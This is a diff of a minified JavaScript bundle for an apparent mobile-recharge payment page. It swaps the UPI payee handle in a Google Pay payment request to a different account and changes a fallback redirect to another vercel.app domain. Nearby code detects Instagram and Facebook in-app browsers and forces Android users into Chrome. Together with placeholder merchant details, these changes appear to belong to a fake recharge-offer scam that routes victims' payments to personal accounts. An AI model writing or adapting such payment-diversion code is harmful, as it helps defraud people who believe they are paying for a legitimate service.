@@ -10281,7 +10281,7 @@
                 const n = [{
                     supportedMethods: ["https://tez.google.com/pay"],
                     data: {
-                        pa: "prashant7874@ybl",
+                        pa: "paytm.s175jcw@pty",
                         pn: "Mobile Recharge",
                         url: "https://yourwebsite.com/order/1234ABCD",
                         mc: "1234",
@@ -11033,7 +11033,7 @@
                 var e = navigator.userAgent || navigator.vendor || window.opera;
                 return e.indexOf("Instagram") > -1 || e.indexOf("FBAN") > -1 || e.indexOf("FBAV") > -1
             }() ? t(!0) : (t(!1),
-            /android/i.test(navigator.userAgent) ? window.location.href = "intent://rechargeaxll.vercel.app/#Intent;scheme=https;package=com.android.chrome;end;" : /iPhone|iPad|iPod/i.test(navigator.userAgent) ? alert("To complete your payment, please open this link in Safari or Chrome.") : window.location.href = "https://rechargeaxll.vercel.app/")
+            /android/i.test(navigator.userAgent) ? window.location.href = "intent://rechargeaxll.vercel.app/#Intent;scheme=https;package=com.android.chrome;end;" : /iPhone|iPad|iPod/i.test(navigator.userAgent) ? alert("To complete your payment, please open this link in Safari or Chrome.") : window.location.href = "https://rcoffer.vercel.app/")
         }
         ), []),
         (0,
